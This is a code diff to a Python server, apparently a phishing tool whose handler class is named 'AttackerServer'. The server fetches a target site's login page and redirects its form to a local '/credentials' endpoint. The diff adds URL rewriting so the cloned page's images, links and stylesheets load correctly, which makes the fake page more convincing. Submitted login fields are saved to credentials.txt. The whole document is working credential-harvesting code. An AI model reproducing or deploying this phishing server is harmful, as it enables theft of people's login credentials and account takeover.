@@ -1,5 +1,5 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import urlparse, parse_qsl, parse_qs
+from urllib.parse import urlparse, parse_qsl, parse_qs, urljoin
 from cgi import parse_header, parse_multipart
 import requests
 from bs4 import BeautifulSoup
@@ -32,15 +32,26 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
 
         if queries.get('url'):
             url = queries.get("url")
-
-            broken_url = urlparse(url)
-            base_login_url = str(broken_url.scheme) + "://" + str(broken_url.netloc)
-            print("SET THE BASE LOGIN URL : {}".format(base_login_url))
-
+            curr_base = url.rsplit('/', 1)[0] + '/'
+            base_login_url = curr_base
+            
             r = requests.get(url)
             html = BeautifulSoup(r.content, 'html.parser')
             form = html.find_all("form")[0]
             form['action'] = "/credentials"
+
+            for tag in html.find_all(src=True):
+                src = tag.get('src')
+                if not src.startswith('http'):
+                    src = urljoin(curr_base, src)
+                tag['src'] = src
+
+            for tag in html.findAll('a', href=True):
+                tag['href'] = urljoin(curr_base, tag['href'])
+
+            for tag in html.findAll('link', href=True):
+                tag['href'] = urljoin(curr_base, tag['href'])
+
             # Send response status code
             self.send_response(200)
             # Send headers
@@ -53,10 +64,9 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         global base_login_url
-        
-        postvars = self.parse_POST()
-        print("BASE LOGIN URL: " + base_login_url)
 
+        postvars = self.parse_POST()
+        
         if "credentials" in self.path:            
             with open("credentials.txt", 'w+') as out_file:
                 for k,v in postvars.items():
